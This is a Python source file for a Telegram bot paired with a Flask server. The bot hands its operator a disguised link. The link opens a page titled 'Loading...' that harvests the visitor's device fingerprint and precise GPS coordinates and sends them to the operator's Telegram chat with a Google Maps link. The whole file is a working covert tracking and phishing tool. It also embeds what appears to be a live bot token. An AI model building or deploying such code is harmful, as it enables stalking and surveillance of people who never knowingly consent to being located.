import os
import threading
import requests
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ---------- Token input / env ----------
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    BOT_TOKEN = input("8938848531:AAHbQ0-RLlLfeiSb-P8ZoNfiEef__pBlMXU").strip()

# Server ka public base URL (Vercel/Render/ngrok).
# Agar deploy karte ho to env me daal do: BASE_URL=https://xxx.vercel.app
BASE_URL = os.getenv("BASE_URL", "").rstrip("/")

app = Flask(__name__)

# chat_id -> last data (optional, tracking ke liye)
CHAT_IDS = set()

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading...</title></head>
<body>
<h3>Please allow location...</h3>
<script>
async function send(data){
  await fetch("/collect?id={{ id }}", {
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify(data)
  });
}
function basicInfo(){
  const nav = navigator;
  return {
    userAgent: nav.userAgent,
    platform: nav.platform,
    language: nav.language,
    screen: `${screen.width}x${screen.height}`,
    deviceMemory: nav.deviceMemory || "N/A",
    hardwareConcurrency: nav.hardwareConcurrency || "N/A",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    touch: 'ontouchstart' in window,
    online: nav.onLine
  };
}
async function main(){
  await send({type:"basic", data: basicInfo()});
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      async pos => {
        const loc = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          maps: `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
        };
        await send({type:"location", data: loc});
        document.body.innerHTML = "<h3>✅ Done. Aap Telegram par wapas ja sakte hain.</h3>";
      },
      async err => {
        await send({type:"location", data:{error:err.message}});
        document.body.innerHTML = "<h3>Location denied.</h3>";
      },
      {enableHighAccuracy:true, timeout:15000}
    );
  } else {
    document.body.innerHTML = "<h3>Geolocation not supported.</h3>";
  }
}
main();
</script>
</body>
</html>
"""

@app.route("/collect", methods=["POST"])
def collect():
    chat_id = request.args.get("id")
    if not chat_id:
        return {"ok": False}, 400
    payload = request.get_json(force=True)
    kind = payload.get("type")
    data = payload.get("data", {})

    if kind == "basic":
        text = (
            "📱 *Device Info*\n"
            f"• Chat ID: `{chat_id}`\n"
            f"• UA: `{data.get('userAgent')}`\n"
            f"• Platform: `{data.get('platform')}`\n"
            f"• Screen: `{data.get('screen')}`\n"
            f"• RAM (approx GB): `{data.get('deviceMemory')}`\n"
            f"• CPU cores: `{data.get('hardwareConcurrency')}`\n"
            f"• Lang: `{data.get('language')}`\n"
            f"• TZ: `{data.get('timezone')}`\n"
            f"• Touch: `{data.get('touch')}`"
        )
    elif kind == "location":
        if "error" in data:
            text = f"📍 *Location*\nChat ID: `{chat_id}`\nError: {data['error']}"
        else:
            text = (
                "📍 *Location*\n"
                f"• Chat ID: `{chat_id}`\n"
                f"• Lat: `{data['lat']}`\n"
                f"• Lon: `{data['lon']}`\n"
                f"• Acc: `{data['accuracy']} m`\n"
                f"[Google Maps]({data['maps']})"
            )
    else:
        text = f"Unknown: {data}"

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, json={
        "chat_id": chat_id, "text": text,
        "parse_mode": "Markdown", "disable_web_page_preview": True
    })
    return {"ok": True}

# Landing page — ?b=p&id=<chat_id> format (jaise sample)
@app.route("/")
def landing():
    chat_id = request.args.get("id", "")
    return render_template_string(HTML_PAGE, id=chat_id)

# ---------- Telegram bot ----------
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    CHAT_IDS.add(update.effective_chat.id)
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("📱 Get Device Info", callback_data="device")],
        [InlineKeyboardButton("📍 Get Location", callback_data="location")]
    ])
    await update.message.reply_text(
        "Namaste! Neeche button choose karo:\n"
        "• 📱 Device info\n"
        "• 📍 Location",
        reply_markup=kb
    )

async def button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    chat_id = q.message.chat_id
    CHAT_IDS.add(chat_id)

    if not BASE_URL:
        await q.message.reply_text(
            "⚠️ BASE_URL set nahi hai. Server deploy karke env me BASE_URL daalo "
            "(jaise https://your-app.vercel.app)."
        )
        return

    # Aapke sample format me: /?b=p&id=<chat_id>
    link = f"{BASE_URL}/?b=p&id={chat_id}"

    if q.data == "device":
        msg = f"🔗 *Device Info:*\n[Open Link]({link})"
    else:
        msg = f"🔗 *Location:*\n[Open Link]({link})"

    await q.message.reply_text(
        msg, parse_mode="Markdown", disable_web_page_preview=True
    )

def main():
    threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000))),
        daemon=True
    ).start()

    bot = Application.builder().token(BOT_TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(CallbackQueryHandler(button))
    bot.run_polling()

if __name__ == "__main__":
    main()